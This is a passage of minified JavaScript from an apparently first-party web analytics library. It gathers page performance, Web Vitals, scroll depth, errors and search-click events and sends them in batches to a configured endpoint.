crypto&&"function"==typeof crypto.getRandomValues){var i=new Uint32Array(2);crypto.getRandomValues(i),n=parseFloat("".concat(i[0]).concat(i[1]))/1e20}var r=(t+16*n)%16|0;return t=Math.floor(t/16),("x"===e?r:3&r|8).toString(16)}));return e&&(n=n.concat("-",e)),n}function $(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,i)}return n}function ee(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?$(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):$(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var te=function(){var e,t=(e={},window.performance?("function"==typeof window.performance.getEntriesByType&&Array.isArray(window.performance.getEntriesByType("navigation"))&&window.performance.getEntriesByType("navigation").length>0?e.page=window.performance.getEntriesByType("navigation")[0]:"object"===s(window.performance.timing)&&(e.page=window.performance.timing),"function"==typeof window.performance.getEntriesByType&&(e.resources=window.performance.getEntriesByType("resource"),e.paint=window.performance.getEntriesByType("paint")),e):e);return G.log("Performance data collected",t),t};function ne(e){var t=e.config,n=e.key,i={};return n&&"object"===s(t.dictionary)&&"object"===s(t.dictionary[n])?(i=ee({},t.dictionary[n]),G.log("Retrived dictionary data",i)):G.log("Dictionary or data for given key is not found",n),i}function ie(){var e=(new Date).getTime();return G.log("Timestamp updated",e),e}function re(e){var t=e.state,n=e.config;if(n.timestampOffsetEndpoint){var i=(new Date).getTime(),r=i;X(n.timestampOffsetEndpoint,{clientTimestamp:i}).then((function(e){var n=(new Date).getTime();t.clientTimestampOffset=Math.floor(e.offSet-(n-r)/2)}))}}function oe(e){if(!e.config.externalClientId)return null;try{for(var t=null,n=["s_vi","s_fid"],i=0;null===t&&i<n.length;){var r=new RegExp("".concat(n[i],"=([^s;]+)")),o=document.cookie.match(r);o&&o[1]?t=o[1]:i++}return null===t&&G.log("No Omniture user id found."),G.log("externalClientId updated",t),t}catch(e){return G.log("Error occur while trying to find Omniture id.",e),null}}function se(e){var t=e.config;if(!t.clientId)return null;if(Q()&&localStorage.getItem(V)){var n=localStorage.getItem(V),i=n.split("-")||[],r=(new Date).getTime(),o=t.clientIdRotationPeriod&&r-i[i.length-1]>t.clientIdRotationPeriod;if(G.log("Retrivd clientId from the local storage",n),!o)return n}var s=Y((new Date).getTime().toString());return G.log("New clientId is generated",s),Z()&&(localStorage.setItem(V,s),G.log("ClientId saved to local storage",s)),s}function ae(e){return window.location.search.indexOf("".concat(e,"="))>=0}function ce(e){var t=window.location.search,n="",i="".concat(e,"=");return t&&t.length&&t.indexOf(i)>=0&&(n=(t.split(i)[1]||"").split("&")[0],G.log("".concat(e," query parameter captured"),n)),n}function le(e){var t=e.config,n=e.eventType,i=e.spec,r=void 0===i?{}:i,o=e.state;if(!n)return G.log('"eventType" is not specified in gatherData function.'),null;var s={timestamp:!0,url:!0,referrer:!0,eventId:!0,externalClientId:!0,performance:!1,scrollDepth:!0,timeOnPage:!0,webVitals:!1,cid:ae("cid"),caller:ae("caller")};(function(e){var t=e.config,n=e.itemType;return n===q.systemPerformance||!!(100*Math.random()<=t.performanceDataThrottlingPercentage&&t.reportThrottledPerformanceDataTypes.indexOf(n)>=0)})({itemType:n,config:t})&&(s.performance=!0),function(e){var t=e.config,n=e.itemType;return n===q.systemWebVitals||!!(100*Math.random()<=t.webVitalDataThrottlingPercentage&&t.reportThrottledWebVitalDataTypes.indexOf(n)>=0)}({itemType:n,config:t})&&(s.webVitals=!0);var a,c,l={type:n,clientTimestamp:null,url:null,referrer:null,scrollDepth:null,timeOnPage:null,performance:{},cwv:{}};return(s=Object.assign(s,r)).timestamp&&(l.clientTimestamp=t.timestampOffset?ie()+o.clientTimestampOffset:ie()),s.url&&(l.url=(a=window.location.href,G.log("Page url updated",a),a)),s.referrer&&(l.referrer=(c=document.referrer,G.log("Page referrer updated",c),c)),s.performance&&(l.performance=te()),s.webVitals&&(l.cwv=o.cwv||{}),s.scrollDepth&&(function(e){var t=e.config,n=e.state;if(t.trackScrollDepth){var i,r,o=(i=document.body,r=document.documentElement,Math.max(i.scrollHeight,i.offsetHeight,r.clientHeight,r.scrollHeight,r.offsetHeight));n.documentHeight=o,G.log("Document height updated",n.documentHeight),o<=window.innerHeight&&(n.maxYScroll=window.innerHeight,G.log("Document height <= window height, scroll depth set to window height"))}}({config:t,state:o}),l.scrollDepth=function(e){var t=e.state;if(!e.config.trackScrollDepth)return null;var n=t.documentHeight>0?t.maxYScroll/t.documentHeight:0;return G.log("Scroll depth updated",n),parseFloat("".concat(n))}({config:t,state:o})),s.timeOnPage&&(l.timeOnPage=function(e){var t=e.state;if(!e.config.trackTimeOnPage)return null;var n=(new Date).getTime()-t.startTime;return G.log("Time spent on the page updated",n),n}({config:t,state:o})),s.eventId&&(l.eventId=Y()),(s.cid||s.caller)&&(l.page=ee(ee(ee({},l.page),s.cid&&{cid:ce("cid")}),s.caller&&{caller:ce("caller")})),G.log("Data prepared",l),l}function ue(e){return document.cookie.split(";").find((function(t){return t.trim().startsWith("".concat(e,"="))}))}function he(e,t){ue(e)&&(document.cookie="".concat(e,"=;expires=Thu, 01 Jan 1970 00:00:01 GMT;domain=").concat(t))}function de(e){var t=function(e){var t={};return e.forEach((function(e){Object.keys(e).forEach((function(n){t[n]=e[n]}))})),t},n=function e(n,i,r){var o=arguments.length>3&&void 0!==arguments[3]&&arguments[3],a={},c=i;return void 0!==r&&""!==r&&(c=o?"".concat(r,"[").concat(i,"]"):"".concat(r,".").concat(i)),"object"!==s(n)||Array.isArray(n)||null===n?(a[c]=n,a):(Object.keys(n).forEach((function(i){var r=Array.isArray(n),o=e(n[i],i,c,r);a=t([a,o])})),a)};return Array.isArray(e)?e.map((function(e){return n(e)})):n(e)}function pe(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,i)}return n}function fe(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?pe(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):pe(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var me=function(e){var t=e.config,n=e.data,i=e.state,r=e.spec,o=void 0===r?{}:r,s=n,a={timestampOffset:t.timestampOffset,timezoneOffset:!0,timezoneName:!0,clientId:!0,externalClientId:!0,techData:!0,viewId:!0,trackSurvey:t.trackSurvey};return a=Object.assign(a,o),t.source?(s={source:t.source,batch:{clientId:se({config:t}),msgId:Y(),externalClientId:oe({config:t}),batchClientTimestamp:a.timestampOffset?(new Date).getTime()+i.clientTimestampOffset:(new Date).getTime(),libraryVersion:"1.1.1",appDataSchemaVersion:t.appDataSchemaVersion||"1.0.0"},events:de(JSON.parse(JSON.stringify(n)))},a.timestampOffset&&(s.batch.clientTimestampOffset=i.clientTimestampOffset),a.viewId&&(s.batch.viewId=i.viewId),a.timezoneOffset&&(s.batch.clientTimezoneOffset=function(e){if(!e.config.timezoneOffset)return null;var t=(new Date).getTimezoneOffset();return G.log("Timezone offset updated",t),t}({config:t})),a.timezoneName&&(s.batch.clientTimezoneName=function(e){if(!e.config.timezoneName)return null;try{var t=Intl.DateTimeFormat().resolvedOptions().timeZone;return G.log("Timezone name updated",t),t}catch(e){return G.log("Unable to get timezone name.",e),null}}({config:t})),a.techData&&(s.batch=fe(fe({},s.batch),function(){var e={userAgent:navigator.userAgent,browserVendor:navigator.vendor,cookieEnabled:navigator.cookieEnabled,doNotTrack:navigator.doNotTrack,languages:navigator.languages,connection:navigator.connection||navigator.mozConnection||navigator.webkitConnection,screenWidth:window.innerWidth,screenHeight:window.innerHeight};return G.log("Technical data collected",e),e}())),a.lateReporting&&(s.batch.lateReporting=!0),a.trackSurvey&&Object.prototype.hasOwnProperty.call(i,"surveyTracking")&&(s.batch.surveyTracking=i.surveyTracking),s):(window.console&&console.error("Required fields `source` missing."),!1)};function _e(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,i)}return n}function ve(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?_e(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):_e(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var ge=function(){function e(t){var n=t.config,i=t.state;j(this,e),this._config=n,this._state=i,this._queue=new J({key:H,readOldData:n.lateReporting,batching:n.batching})}return U(e,[{key:"_debuggerHook",value:function(e){if("yup"===(window.location.search.split("showNeighborLogs=")[1]||"").split("&")[0])if(Array.isArray(window._neighborHistoryLog)){for(;window._neighborHistoryLog.length>=20;)window._neighborHistoryLog.shift();window._neighborHistoryLog.push(e)}else window._neighborHistoryLog=[],window._neighborHistoryLog.push(e);else if(Array.isArray(window._neighborHistoryLog)){for(;window._neighborHistoryLog.length>=5;)window._neighborHistoryLog.shift();window._neighborHistoryLog.push(e)}else window._neighborHistoryLog=[],window._neighborHistoryLog.push(e)}},{key:"_sendThroughHTTP",value:function(e){var t=this;if(!e||!e.data||0!==e.data.length){var n=0;this._config.timestampOffset&&(n=(new Date).getTime()),X(this._config.endpoint,e).then((function(i){if(G.log("Data sent to server using http req",e),t._debuggerHook(e),t._config.timestampOffset){var r=(new Date).getTime();t._state.clientTimestampOffset=Math.floor(i.offSet-(r-n)/2)}Object.prototype.hasOwnProperty.call(i,"config")&&(t._config=ve(ve({},t._config),i.config)),t._config.batching&&t._queue.removeBeacon(),t._queue.flushHTTP(),t._queue.HTTPlength>0&&t._sendThroughHTTP(me({data:t._queue.peek(t._queue.types.HTTPall),config:t._config,state:t._state}))}))}}},{key:"_sendThroughBeacon",value:function(e){e&&e.data&&0===e.data.length||(navigator.sendBeacon(this._config.endpoint,JSON.stringify(e))?(this._debuggerHook(e),G.log("Data sent to server using beacon",e),this._queue.removeBeacon(),this._queue.Beaconlength>0&&this._sendThroughBeacon(me({data:this._queue.peek(this._queue.types.BeaconCHUNK),config:this._config,state:this._state}))):this._sendThroughHTTP(e))}},{key:"_debug",value:function(){return this._queue}},{key:"postDataToNetwork",value:function(e){var t=e.state,n=void 0===t?this._state:t;0!==this._queue.length&&(this._config.batching?this._sendThroughBeacon(me({data:this._queue.getChunkData(),config:this._config,state:n})):this._sendThroughHTTP(me({data:this._queue.getAllData(),config:this._config,state:n})))}},{key:"postLateReportingDataToNetwork",value:function(){if(0!==this._queue.length)if(this._config.batching){var e=localStorage.getItem(this._queue.queueName(this._queue.queueTypes.RAW)),t=localStorage.getItem(this._queue.queueName(this._queue.queueTypes.CHUNKED));(t&&t.length>2||e&&e.length>2)&&this._sendThroughBeacon(me({data:this._queue.getChunkData(),config:this._config,state:this._state,spec:{lateReporting:!0}}))}else{var n=localStorage.getItem(this._queue.queueName(this._queue.queueTypes.HTTPONLY));n&&n.length>2&&this._sendThroughHTTP(me({data:this._queue._nonBeacon_HTTPOnly_BackupStore,config:this._config,state:this._state,spec:{lateReporting:!0}}))}}},{key:"resetTimer",value:function(e){var t=this,n=e.timer,i=e.state;return clearTimeout(n),setTimeout((function(){t.postDataToNetwork({state:i})}),this._config.batchingInterval)}},{key:"resetTimerWhenRawDataExist",value:function(e){var t=e.timer,n=e.state,i=null,r=localStorage.getItem(this._queue.queueName(this._queue.queueTypes.RAW));return r&&JSON.parse(r).length>0?i=this.resetTimer({timer:t,state:n}):clearTimeout(t),i}},{key:"gatherDataAndPushToQueue",value:function(e){var t=e.eventType,n=e.extraData,i=e.state;if(!this._config.urlValidator||this._config.urlValidator()){var r=le({config:this._config,eventType:t,state:i});if(r){if(Object.keys(i.page).length>0&&(r.page=ve(ve({},r.page),i.page)),[q.systemEvent,q.appEvent].indexOf(t)>=0&&(r.component=ve({},n),G.log("Component property has been added to data",JSON.stringify(r.component))),Q()&&Z()&&localStorage.getItem("".concat(H,"-timestamp"))){var o=localStorage.getItem("".concat(H,"-timestamp")),s=(new Date).getTime();if(s-o>this._config.inactivityClientIdRotationInterval){var a=Y(s.toString());localStorage.setItem(V,a),G.log("ClientId saved to local storage",a)}}this._queue.add(ve({},r)),G.log("Data added to the queue",JSON.stringify(ve({},r)))}else G.log("Unable to prepare data")}else G.log("urlValidator found. URL is disabled.")}},{key:"gatherDataAndSetCookie",value:function(e){var t=e.eventType,n=e.extraData,i=e.state;if(!this._config.urlValidator||this._config.urlValidator()){var r=le({config:this._config,eventType:t,state:i});if(r){Object.keys(i.page).length>0&&(r.page=ve(ve({},r.page),i.page)),[q.systemEvent,q.appEvent].indexOf(t)>=0&&(r.component=ve({},n),G.log("Component property has been added to data",r));var o=me({data:[r],config:this._config,state:this._state}),s=JSON.stringify(o),a=new Date;a.setTime(a.getTime()+this._config.cookieExpire),document.cookie="".concat(this._config.cookieName,"=").concat(escape(s),";expires=").concat(a.toGMTString(),";path=/;domain=").concat(this._config.cookieDomain),G.log("Data is set to the cookie","".concat(this._config.cookieName,"=").concat(s))}else G.log("Unable to prepare data")}else G.log("urlValidator found. URL is disabled.")}},{key:"postCookieDataToNetwork",value:function(e){var t=e.payload;this._sendThroughHTTP(t)}},{key:"gatherDataAndPostToNetwork",value:function(e){var t=e.eventType,n=e.extraData,i=e.flushData,r=void 0!==i&&i,o=e.state;this.gatherDataAndPushToQueue({eventType:t,extraData:n,state:o}),this._config.batching&&!r||this.postDataToNetwork({state:o})}},{key:"gatherDataAndResetTimer",value:function(e){var t=e.eventType,n=e.extraData,i=e.state,r=e.timer,o=null;if(this._config.batching){var s=this._config.batchingInterruptionEvents.filter((function(e){return"string"==typeof e})),a=this._config.batchingInterruptionEvents.filter((function(e){return function(e){return e instanceof Object&&e.constructor===Object}(e)}));switch(t){case"app:load":case"app:unload":if(this._config.batchingInterruptionEvents.some((function(e){return"app:load"===e||"app:unload"===e}))){this.gatherDataAndPostToNetwork({eventType:t,flushData:!0,state:i});var c=localStorage.getItem(this._queue.queueName(this._queue.queueTypes.RAW));c&&JSON.parse(c).length>0?o=this.resetTimer({timer:r,state:i}):clearTimeout(r)}else this.gatherDataAndPushToQueue({state:i,eventType:t}),o=this.resetTimer({timer:r,state:i});break;case"app:event":if(s.indexOf("app:event")>=0||a.filter((function(e){return"app:event"===e.type})).some((function(e){return function(e,t){var n=de(arguments.length>2&&void 0!==arguments[2]?arguments[2]:{});return!!(Object.prototype.hasOwnProperty.call(e,"type")&&e.type===t&&Array.isArray(e.fields)&&e.fields.some((function(e){return!!(Object.prototype.hasOwnProperty.call(e,"path")&&Object.prototype.hasOwnProperty.call(e,"value")&&Object.prototype.hasOwnProperty.call(n,"".concat(e.path))&&n["".concat(e.path)]===e.value)})))}(e,"app:event",n)}))){this.gatherDataAndPostToNetwork({eventType:t,flushData:!0,extraData:n,state:i});var l=localStorage.getItem(this._queue.queueName(this._queue.queueTypes.RAW));l&&JSON.parse(l).length>0?o=this.resetTimer({timer:r,state:i}):clearTimeout(r)}else this.gatherDataAndPushToQueue({state:i,extraData:n,eventType:t}),o=this.resetTimer({timer:r,state:i});break;case"system:performance":if(this._config.batchingInterruptionEvents.indexOf("system:performance")>=0){this.gatherDataAndPostToNetwork({eventType:t,flushData:!0,state:i});var u=localStorage.getItem(this._queue.queueName(this._queue.queueTypes.RAW));u&&JSON.parse(u).length>0?o=this.resetTimer({timer:r,state:i}):clearTimeout(r)}else this.gatherDataAndPushToQueue({state:i,eventType:t}),o=this.resetTimer({timer:r,state:i});break;case"system:cwv":if(this._config.batchingInterruptionEvents.indexOf("system:cwv")>=0){this.gatherDataAndPostToNetwork({eventType:t,flushData:!0,state:i});var h=localStorage.getItem(this._queue.queueName(this._queue.queueTypes.RAW));h&&JSON.parse(h).length>0?o=this.resetTimer({timer:r,state:i}):clearTimeout(r)}else this.gatherDataAndPushToQueue({state:i,eventType:t}),o=this.resetTimer({timer:r,state:i});break;case"app:survey":if(this._config.batchingInterruptionEvents.indexOf("app:survey")>=0){this.gatherDataAndPostToNetwork({eventType:t,flushData:!0,state:i});var d=localStorage.getItem(this._queue.queueName(this._queue.queueTypes.RAW));d&&JSON.parse(d).length>0?o=this.resetTimer({timer:r,state:i}):clearTimeout(r)}else this.gatherDataAndPushToQueue({state:i,eventType:t}),o=this.resetTimer({timer:r,state:i});break;case"app:marcom-search":if(this._config.batchingInterruptionEvents.indexOf("app:marcom-search")>=0){this.gatherDataAndPostToNetwork({eventType:t,flushData:!0,state:i});var p=localStorage.getItem(this._queue.queueName(this._queue.queueTypes.RAW));p&&JSON.parse(p).length>0?o=this.resetTimer({timer:r,state:i}):clearTimeout(r)}else this.gatherDataAndPushToQueue({state:i,eventType:t}),o=this.resetTimer({timer:r,state:i});break;case"system:preceding":if(this._config.batchingInterruptionEvents.indexOf("system:preceding")>=0){this.gatherDataAndPostToNetwork({eventType:t,flushData:!0,state:i});var f=localStorage.getItem(this._queue.queueName(this._queue.queueTypes.RAW));f&&JSON.parse(f).length>0?o=this.resetTimer({timer:r,state:i}):clearTimeout(r)}else this.gatherDataAndPushToQueue({state:i,eventType:t}),o=this.resetTimer({timer:r,state:i})}}else n?this.gatherDataAndPostToNetwork({state:i,extraData:n,eventType:t}):this.gatherDataAndPostToNetwork({state:i,eventType:t});return o}},{key:"action",value:function(e){var t=e.actionData,n=e.dictionaryKey,i=void 0===n?null:n,r=e.timer,o=e.state;if(!o.initialized)return null;var a=null;if(t&&"object"===s(t)){G.log("App marcom action received",t,i);var c={};i&&(c=ne(i)),a=this.gatherDataAndResetTimer({eventType:q.appEvent,state:o,extraData:Object.assign(c,t),timer:r}),G.log("Marcom action data collection success",JSON.stringify(Object.assign(c,t)))}else G.log("Marcom action data should be an object",t);return a}}]),e}();function ye(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,i)}return n}function be(e,t,n){var i=function(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?ye(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):ye(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}({},t);return Object.keys(e).forEach((function(r){if(r.startsWith("_")||void 0===t[r])n.log("".concat(r," is not a valid config prop."));else if(!0===t[r].allowOverwrite){var o,a,c;if(o=e[r],a=t[r].type,c=function(e,t){return"array"===t?Array.isArray(e):s(e)===t},"string"==typeof a?c(o,a):!!Array.isArray(a)&&a.some((function(e){return c(e)}))){if("function"==typeof t[r].validator&&!t[r].validator(e[r]))return void n.log("".concat(r," config prop has not passed custom property validation check. Validator: ").concat(t[r].validator,"."));if(function(e,t){return"object"===s(e)?JSON.stringify(e)===JSON.stringify(t):"function"!=typeof e&&e===t}(e[r],t[r].value))n.log("".concat(r," config prop value is the same as current config value."));else{if("function"==typeof t[r].modifier){var l=t[r].modifier(e[r]);n.log("".concat(r," user config prop value has been modified by modifier. New value: ").concat(l,". Old value: ").concat(JSON.stringify(i[r]),".")),e[r]=l}n.log("".concat(r," config prop value has been updated. New value: ").concat(e[r],". Old value: ").concat(JSON.stringify(i[r]),".")),i[r]={value:e[r]}}}else n.log("".concat(r," config prop has invalid type. Allowed types: ").concat(t[r].type,"."))}else n.log("".concat(r," config prop is read-only."))})),i}var we,Ee="1.1.1";function ke(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,i)}return n}function xe(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?ke(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):ke(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var Se,Te=null,Ce={},Oe={cls:0,fid:0,lcp:0,fcp:0,ttfb:0};function Ae(){!function(e,t){t=t||{};var n=[.1,.25];T||(S((function(e){C=e.value})),T=!0);var i,r=function(e){C>-1&&function(e){Oe.cls=e.value}(e)},o=v("CLS",0),s=0,a=[],c=function(e){e.forEach((function(e){if(!e.hadRecentInput){var t=a[0],n=a[a.length-1];s&&e.startTime-n.startTime<1e3&&e.startTime-t.startTime<5e3?(s+=e.value,a.push(e)):(s=e.value,a=[e]),s>o.value&&(o.value=s,o.entries=a,i())}}))},l=g("layout-shift",c);l&&(i=b(r,o,n,t.reportAllChanges),y((function(){c(l.takeRecords()),i(!0)})),f((function(){s=0,C=-1,o=v("CLS",0),i=b(r,o,n,t.reportAllChanges)})))}(),function(e,t){t=t||{};var n,i=[100,300],r=x(),o=v("FID"),s=function(e){e.startTime<r.firstHiddenTime&&(o.value=e.processingStart-e.startTime,o.entries.push(e),n(!0))},l=function(e){e.forEach(s)},h=g("first-input",l);n=b(e,o,i,t.reportAllChanges),h&&y((function(){l(h.takeRecords()),h.disconnect()}),!0),h&&f((function(){var r;o=v("FID"),n=b(e,o,i,t.reportAllChanges),u=[],c=-1,a=null,F(addEventListener),r=s,u.push(r),P()}))}((function(e){Oe.fid=e.value})),function(e,t){t=t||{};var n,i=[2500,4e3],r=x(),o=v("LCP"),s=function(e){var t=e[e.length-1];if(t){var i=t.startTime-_();i<r.firstHiddenTime&&(o.value=i,o.entries=[t],n())}},a=g("largest-contentful-paint",s);if(a){n=b(e,o,i,t.reportAllChanges);var c=function(){M[o.id]||(s(a.takeRecords()),a.disconnect(),M[o.id]=!0,n(!0))};["keydown","click"].forEach((function(e){addEventListener(e,c,{once:!0,capture:!0})})),y(c,!0),f((function(r){o=v("LCP"),n=b(e,o,i,t.reportAllChanges),requestAnimationFrame((function(){requestAnimationFrame((function(){o.value=performance.now()-r.timeStamp,M[o.id]=!0,n(!0)}))}))}))}}((function(e){Oe.lcp=e.value})),S((function(e){Oe.fcp=e.value})),R((function(e){Oe.ttfb=e.value}))}function Le(e){e="string"!=typeof e?JSON.stringify(e):e;try{e=JSON.parse(e)}catch(e){return!1}return"object"===s(e)&&null!==e}function Pe(){var e={documentHeight:0,maxYScroll:0,startTime:(new Date).getTime(),appLoadHasBeenReported:!1,initialized:!1,page:{},msgId:Y(),viewId:Y(),clientTimestampOffset:0};Ce=Object.prototype.hasOwnProperty.call(Ce,"cwv")?xe({cwv:Oe},e):xe({},e),G.log("Reset state",Ce)}function De(e){var t=e.cfg,n=e.innerState;clearTimeout(Te),Te=setTimeout((function(){Se.postDataToNetwork({state:n})}),t.batchingInterval)}function Fe(e){var t=e.cfg,n=e.innerState;t.batching?De({cfg:t,innerState:n}):Se.postDataToNetwork({state:n})}function Me(e){var t=e.cfg;t.lateReporting&&Se.postLateReportingDataToNetwork(),t.trackCookie&&(window.addEventListener("DOMContentLoaded",(function(){var e=(ue(t.cookieName)||"").split("=")[1];e&&Le(unescape(e))&&Se.postCookieDataToNetwork({payload:JSON.parse(unescape(e))}),he(t.cookieName,t.cookieDomain)})),window.addEventListener("load",(function(){var e=(ue(t.cookieName)||"").split("=")[1];e&&Le(unescape(e))&&Se.postCookieDataToNetwork({payload:JSON.parse(unescape(e))}),he(t.cookieName,t.cookieDomain)}))),["DOMContentLoaded","load","focus","blur","unload","pagehide","visibilitychange"].forEach((function(e){if("visibilitychange"!==e){var n=r(z[e],2),i=n[0],o=n[1];t[i]&&(t.batching?t.batchingInterruptionEvents.indexOf(e)>=0?window.addEventListener(e,(function(){if(Se.gatherDataAndPushToQueue({state:Ce,eventType:q[o]}),Se.postDataToNetwork({state:Ce}),Te){var e=localStorage.getItem("".concat(H,"-raw"));e&&JSON.parse(e).length>0?De({cfg:t,innerState:Ce}):clearTimeout(Te)}})):window.addEventListener(e,(function(){Se.gatherDataAndPushToQueue({state:Ce,eventType:q[o]}),De({cfg:t,innerState:Ce})})):window.addEventListener(e,(function(){Se.gatherDataAndPostToNetwork({state:Ce,eventType:q[o]})})))}else{var s=t.trackVisibilitychangeVisible,a=t.trackVisibilitychangeHidden,c=t.batchingInterruptionEvents.indexOf("visibilitychangeVisible")>=0,l=t.batchingInterruptionEvents.indexOf("visibilitychangeHidden")>=0;(s||a)&&(t.batching?c||l?window.addEventListener(e,(function(){if(s&&"visible"===document.visibilityState)if(c){if(Se.gatherDataAndPushToQueue({state:Ce,eventType:q.systemVisibilitychangeVisible}),Se.postDataToNetwork({state:Ce}),Te){var e=localStorage.getItem("".concat(H,"-raw"));e&&JSON.parse(e).length>0?De({cfg:t,innerState:Ce}):clearTimeout(Te)}}else Se.gatherDataAndPushToQueue({state:Ce,eventType:q.systemVisibilitychangeVisible}),De({cfg:t,innerState:Ce});else if(a&&"hidden"===document.visibilityState)if(l){if(Se.gatherDataAndPushToQueue({state:Ce,eventType:q.systemVisibilitychangeHidden}),Se.postDataToNetwork({state:Ce}),Te){var n=localStorage.getItem("".concat(H,"-raw"));n&&JSON.parse(n).length>0?De({cfg:t,innerState:Ce}):clearTimeout(Te)}}else Se.gatherDataAndPushToQueue({state:Ce,eventType:q.systemVisibilitychangeHidden}),De({cfg:t,innerState:Ce})})):window.addEventListener(e,(function(){s&&"visible"===document.visibilityState?(Se.gatherDataAndPushToQueue({state:Ce,eventType:q.systemVisibilitychangeVisible}),De({cfg:t,innerState:Ce})):a&&"hidden"===document.visibilityState&&(Se.gatherDataAndPushToQueue({state:Ce,eventType:q.systemVisibilitychangeHidden}),De({cfg:t,innerState:Ce}))})):window.addEventListener(e,(function(){s&&"visible"===document.visibilityState?Se.gatherDataAndPostToNetwork({state:Ce,eventType:q.systemVisibilitychangeVisible}):a&&"hidden"===document.visibilityState&&Se.gatherDataAndPostToNetwork({state:Ce,eventType:q.systemVisibilitychangeHidden})})))}})),function(e){var t=e.cfg;window.addEventListener("unhandledrejection",(function(e){var n,i,r;e&&(i=e.type||"",r=e.reason||"",n=e.target.location?e.target.location.href:""),Se.gatherDataAndPushToQueue({state:Ce,eventType:q.systemEvent,extraData:{name:"Error",message:r,url:n,error:i}}),G.log("Unhandled Promise Rejection Error registered"),Fe({cfg:t,innerState:Ce})})),window.addEventListener("error",(function(e){var n,i,r,o,s;if(e){if(e.constructor===Event&&e.target.nodeName){switch(e.target.nodeName){case"IMG":o="IMG Resource Error";break;case"LINK":o="CSS Resource Error";break;case"SCRIPT":o="JS Resource Error"}s=e.target.src||"",n=e.target.outerHTML||""}else s=e.filename||"",o=e.error&&"function"==typeof e.error.toString?e.error.toString():"",n=e.message||"";i=e.lineno||0,r=e.colno||0}Se.gatherDataAndPushToQueue({state:Ce,eventType:q.systemEvent,extraData:{name:"Error",message:n,url:s,lineno:i,colno:r,error:o}}),G.log("Error registered"),Fe({cfg:t,innerState:Ce})}),!0),G.log("Errors tracking started")}({cfg:t}),{cfg:t}.cfg.trackScrollDepth&&1!==Ce.maxYScroll&&(window.addEventListener("scroll",(function(){var e=window.scrollY+window.innerHeight;e>Ce.maxYScroll&&(Ce.maxYScroll=e,G.log("Maximun Y scroll distance updated",e))})),G.log("Scroll tracking started")),function(e){var t=e.cfg;t.trackViewportChanges&&(window.addEventListener("resize",(function(){Se.gatherDataAndPushToQueue({state:Ce,eventType:q.systemEvent,extraData:{name:"Viewport changed",width:window.innerWidth,height:window.innerHeight}}),G.log("Viewport changed"),Fe({cfg:t,innerState:Ce})})),G.log("Viewport change tracking started"))}({cfg:t}),t.trackMarcomSearch&&(function(){try{window.nn_analytics=window.nn_analytics||{};var e=document.getElementById("ac-gn-link-search"),t=document.getElementById("ac-gn-searchform-input"),n=window._satellite&&"function"==typeof window._satellite.getVar,i=function(e){for(var t=document.getElementById("ac-gn-searchresults").getElementsByTagName("li"),n=1;n>0&&t[n-1].textContent.trim().toLowerCase()!==e;)n++;return n},r=function(e,t){var r=e.textContent.trim().toLowerCase(),o=e.getAttribute("href").toLowerCase();window._applemd.search={location:"globalnav_support",link_type:t,dest_url:o,link_text:r,link_index:i(r),dest_platform:n?window._satellite.getVar("FN:Get_Link_Dest_Platform")(o):""}};e&&!e.getAttribute("nn-data-analytics-listener-added")&&(e.setAttribute("nn-data-analytics-listener-added","true"),e.addEventListener("mousedown",(function(){window._applemd.search={name:"click-mag-glass",link_type:"acs",link_text:"internal search"},Te=Se.action({actionData:{search:window._applemd.search},timer:Te,state:Ce})}))),window.nn_analytics.document_listener_added||(window.nn_analytics.document_listener_added=!0,document.addEventListener("mousedown",(function(e){!function(e){G.log("link selected event");var t=e.target;"A"!==t.tagName&&"A"===t.parentElement.tagName&&(t=t.parentElement),t.classList.contains("ac-gn-searchresults-link")&&!t.classList.contains("ac-gn-searchresults-link-suggestions")?(r(t,"quicklink"),Te=Se.action({actionData:{search:window._applemd.search},timer:Te,state:Ce})):t.classList.contains("ac-gn-searchresults-link-suggestions")&&(r(t,"suggested 